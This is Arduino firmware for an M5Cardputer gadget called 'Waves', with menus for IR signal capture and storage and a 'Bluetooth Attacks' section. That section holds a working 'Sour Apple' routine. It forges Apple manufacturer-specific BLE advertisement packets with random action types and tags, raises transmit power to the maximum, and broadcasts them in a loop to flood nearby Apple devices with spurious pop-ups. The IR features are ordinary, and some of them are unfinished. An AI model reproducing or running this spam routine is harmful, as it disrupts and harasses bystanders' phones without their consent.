/*
 * This file is part of the BadCard project, originally developed by Iván (VoidNoi).
 * This file is also part of the ESP32-Sour-Apple project, originally developed by RapierXbox.
 * 
 * This file is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This file is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this file.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <M5Cardputer.h>
#include <IRremoteESP8266.h> 
#include <IRrecv.h>
#include <SD.h>
#include <NimBLEDevice.h>

#define display M5Cardputer.Display
#define keyboard M5Cardputer.Keyboard

#define availableOptions 2
#define USECPERTICK 50

#define SD_CS_PIN 12
#define SD_MOSI_PIN 14
#define SD_MISO_PIN 39
#define SD_CLK_PIN 40

String APPversion = "Waves v0.0.1";

int8_t letterHeight = 16.6;
int8_t letterWidth = 12;

int8_t cursorPosX, cursorPosY, screenPosX, screenPosY = 0;

int8_t menuOption = 0;
int8_t bluetoothOption = 0;

int counter;

bool isStartSoundPlayed = false;

//const int bgColor = 0xFC80;

IRrecv irReceiver(1);
decode_results results;

NimBLEAdvertising *pAdvertising;

File myIRFile;

void RFfn();
void irReceiveDecoded();
void bluetoothAttacks();
void about();
void storeIrRaw(decode_results results);

void setup() {
  // put your setup code here, to run once:
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);

  M5Cardputer.Speaker.begin();
  M5Cardputer.Speaker.setVolume(100);

  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("SD initialization failed!");
    while (1);
  }
  
  NimBLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); //This should increase transmitting power to 9dBm
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

  NimBLEServer *pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();

  Serial.begin(115200);

  irReceiver.enableIRIn();

  display.setRotation(1);
  display.setTextColor(BLACK);

  bootLogo();

}

void loop() {
 // M5Cardputer.update();
  
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

int getFileCounter() {
  if (!SD.exists("/waves/utils/counter.txt")) {
    // If the file does not exist, create it with the initial value 0
    File counterFile = SD.open("/waves/utils/counter.txt", FILE_WRITE);
    if (counterFile) {
      counterFile.println(0);
      counterFile.close();
    }
  }

  // Now the file should exist, so we can open it for reading
  File counterFile = SD.open("/waves/utils/counter.txt", FILE_READ);
  if (!counterFile) {
    return 0; // If for some reason we still can't open the file, return 0
  }

  counter = counterFile.parseInt();
  counterFile.close();
  return counter;
}

void saveFileCounter(int counter) {
  File counterFile = SD.open("/waves/utils/counter.txt", FILE_WRITE);
  if (counterFile) {
    counterFile.println(counter);
    counterFile.close();
  }
}

void bootLogo(){
  display.fillScreen(ORANGE);

  display.setTextSize(2.2);
  display.setCursor(display.width()/2.05 - (APPversion.length()/2) * letterWidth, display.height()/2 - 17);
  display.println(APPversion);

  display.setTextSize(1.8);
  display.setCursor(display.width()/2 - 80, display.height()/2 + 40);
  display.println("Press any key...");

  while(true) {
    M5Cardputer.update();
    if (keyboard.isChange()) {
      delay(100);
      mainMenu();
      break;
    }
  }
}

void mainMenu(){

  if(!isStartSoundPlayed){
    isStartSoundPlayed = true;
    M5.Speaker.tone(440, 100);
    delay(100);
    M5.Speaker.tone(440, 100);
    delay(100);
    M5.Speaker.tone(440, 100);
    delay(100);
    M5.Speaker.tone(349, 100);
    delay(100);
    M5.Speaker.tone(523, 100);
    delay(100);
    M5.Speaker.tone(440, 300);
    M5Cardputer.Speaker.end();
  } 
  
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("Main Menu");
  display.setTextSize(1.7);
  display.setCursor(20, 40);
  display.println("1 - RF");
  display.setCursor(20, 60);
  display.println("2 - IR");
  display.setCursor(20, 80);
  display.println("3 - Bluetooth Attacks");
  display.setCursor(20, 100);
  display.println("4 - About");

  while(true) {
    M5Cardputer.update();
      if (keyboard.isChange() && menuOption == 0) {
        delay(100);
        if(keyboard.isKeyPressed('1')){
          menuOption = 1;
          RFfn();
          break;
        } else if(keyboard.isKeyPressed('2')){
          menuOption = 2;
          irOptions();
          break;
        }else if(keyboard.isKeyPressed('3')){
          menuOption = 3;
          bluetoothAttacks();
          break;
        } else if(keyboard.isKeyPressed('4')){
          menuOption = 4;
          about();
          break;
      }
    }
  }
}

void RFfn(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("RF (WIP)");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
  }
}

void about(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 30);
  display.println(APPversion);
  display.setCursor(20, 60);
  display.setTextSize(1.5);
  display.println("Developed by:");
  display.setCursor(20, 80);
  display.println("viniHNS");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
  }
}

void irOptions(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("IR Options");
  display.setTextSize(1.7);
  display.setCursor(20, 30);
  display.println("1 - Read (Decoded)");
  display.setCursor(20, 50);
  display.println("2 - Store (RAW)");
  display.setCursor(20, 70);
  display.println("3 - Send (RAW)");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
    if(keyboard.isKeyPressed('1')){
      irReceiveDecoded();
      break;
    }
    if(keyboard.isKeyPressed('2')){
      irReadAndStore();
      break;
    }
    if(keyboard.isKeyPressed('3')){
      irSend();
      break;
    }
    
  }
}

void bluetoothAttacks(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("Bluetooth Attacks");
  display.setTextSize(1.7);
  display.setCursor(20, 30);
  display.println("1 - Sour Apple");
  display.setCursor(20, 50);
  display.println("2 - WIP");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      bluetoothOption = 0;
      mainMenu();
      break;
    }
    if(keyboard.isKeyPressed('1')){
      bluetoothOption = 1;
      sourApple();
      break;
    }
  }
}

void sourApple(){
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(21, 20);
  display.println("Sour Apple Running...");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  while(true){
    M5Cardputer.update();  
    if(keyboard.isKeyPressed('`')){
      delay(100);
      menuOption = 0;
      bluetoothOption = 0;
      mainMenu();
      break;
    }
    delay(40);
    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  }
  
}

void irReceiveDecoded() {
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(20, 20);
  display.println("Waiting IR signal:");
  while(true){
    M5Cardputer.update();  
    if(keyboard.isKeyPressed('`')){
      delay(100);
      menuOption = 0;
      mainMenu();
    }

    if (irReceiver.decode(&results)) {
      int value = results.value;
      delay(1000);
      display.setTextSize(1.5);
      display.fillRect(20, 20, 200, 30, ORANGE); 
      display.setCursor(20, 20);
      display.println("Signal received:");

      display.setTextSize(2);
      display.setCursor(20, 40);
      display.fillRect(20, 40, 200, 30, ORANGE); 
      if (results.decode_type == UNKNOWN) {   // verify if the IR code could be decoded and show the code type
        display.print("UNK: "); 
      } 
      else if (results.decode_type == NEC) {
        display.print("NEC: ");
      } 
      else if (results.decode_type == SONY) {
        display.print("SONY: ");
      } 
      else if (results.decode_type == RC5) {
        display.print("RC5: ");
      } 
      else if (results.decode_type == RC6) {
        display.print("RC6: ");
      }
      else if (results.decode_type == PANASONIC) { 
        display.print("PANASONIC: ");
      }
      else if (results.decode_type == JVC) {
        display.print("JVC: ");
      }     
      display.println(value, HEX);
      display.setCursor(15, 100);
      display.setTextSize(1.5);
      display.println("Press ESC to return...");
      irReceiver.resume(); // Recebe o próximo valor
      
    }
  }
}

void irReadAndStore(){
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(20, 20);
  display.println("Waiting IR to store:");
  while(true){
    M5Cardputer.update();
    if(keyboard.isKeyPressed('`')){
      delay(100);
      menuOption = 0;
      mainMenu();
    }

    if (irReceiver.decode(&results)) {
      int value = results.value;

      delay(1000);
      display.setTextSize(1.5);
      display.fillRect(20, 20, 200, 30, ORANGE); 
      display.setCursor(20, 20);
      display.println("Signal received:");

      display.setTextSize(2);
      display.setCursor(20, 40);
      display.fillRect(20, 40, 200, 30, ORANGE); 
      if (results.decode_type == UNKNOWN) {   // verify if the IR code could be decoded and show the code type
        display.print("UNK: "); 
      } 
      else if (results.decode_type == NEC) {
        display.print("NEC: ");
      } 
      else if (results.decode_type == SONY) {
        display.print("SONY: ");
      } 
      else if (results.decode_type == RC5) {
        display.print("RC5: ");
      } 
      else if (results.decode_type == RC6) {
        display.print("RC6: ");
      }
      else if (results.decode_type == PANASONIC) { 
        display.print("PANASONIC: ");
      }
      else if (results.decode_type == JVC) {
        display.print("JVC: ");
      }
      display.println(value, HEX);
      display.setCursor(15, 120);
      display.setTextSize(1.5);
      display.println("Press ENTER to store...");
      display.setCursor(15, 100);
      display.setTextSize(1.5);
      display.println("Press ESC to return...");
      
      irReceiver.resume(); // Receives the next value
    }

    if(keyboard.isKeyPressed(KEY_ENTER)){
      delay(100);
      storeIrRaw(results);
      break;
    }
  }
}

void storeIrRaw(decode_results results) {
  int counter = getFileCounter();
  String fileName = "/waves/irData/irData_" + String(counter) + ".txt";

  File myIRFile = SD.open(fileName, FILE_WRITE);

  if (myIRFile) {
    // Write the raw data to the file
    for (int i = 1; i < results.rawlen; i++) {
      myIRFile.println(results.rawbuf[i]*USECPERTICK, DEC);
    }
    myIRFile.close();
    counter++;
    saveFileCounter(counter);
    display.fillScreen(ORANGE);
    display.setTextSize(2);
    display.setCursor(40, 50);
    display.println("IR Stored!");
    delay(1000);
    irOptions();
  } else {
    display.fillScreen(ORANGE);
    display.setCursor(15, 60);
    display.println("Error storing IR!");
    delay(1000);
    irOptions();
  }
}

void irSend(){
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(20, 20);
  display.println("Select an IR signal:");

  getDirectoryIR();

}

void getDirectoryIR() {
  File root = SD.open("/waves/irData");
  if (!root) {
    display.fillScreen(ORANGE);
    display.setCursor(15, 60);
    display.println("Error opening directory!");
    delay(1000);
    irOptions();
  }

  display.setTextSize(1.5);
  int y = 40; // Start y position
  uint8_t selectedFile = 0;
  uint8_t fileCount = 0;
  File files[10]; // Adjust this to the maximum number of files you expect

  // First pass: count the files
  while (true) {
    File entry = root.openNextFile();
    if (!entry) {
      break;
    }
    files[fileCount] = entry;
    fileCount++;
  }

  // Initial display
  display.fillScreen(ORANGE);
  for (int i = 0; i < fileCount; i++) {
    display.setCursor(20, y + i * 20);
    if (i == selectedFile) {
      display.print("> ");
    }
    display.println(files[i].name());
  }

  // Main loop
  while (true) {
    M5Cardputer.update();

    // Check for key presses
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      irOptions();
      break;
    } else if (keyboard.isKeyPressed(';')) {
      // Move the selection up
      if (selectedFile > 0) {
        selectedFile--;
        // Redraw the display
        display.fillScreen(ORANGE);
        for (int i = 0; i < fileCount; i++) {
          display.setCursor(20, y + i * 20);
          if (i == selectedFile) {
            display.print("> ");
          }
          display.println(files[i].name());
        }
      }
    } else if (keyboard.isKeyPressed('.')) {
      // Move the selection down
      if (selectedFile < fileCount - 1) {
        selectedFile++;
        // Redraw the display
        display.fillScreen(ORANGE);
        for (int i = 0; i < fileCount; i++) {
          display.setCursor(20, y + i * 20);
          if (i == selectedFile) {
            display.print("> ");
          }
          display.println(files[i].name());
        }
      }
    } else if (keyboard.isKeyPressed(KEY_ENTER)) {
      // Open the selected file and send the IR signal
      File selected = files[selectedFile];
      if (selected) {
        // TODO: Read the file and send the IR signal
      }
      selected.close();
    }

    delay(100); // Debounce delay
  }

  // Close all files
  for (int i = 0; i < fileCount; i++) {
    files[i].close();
  }
  root.close();
}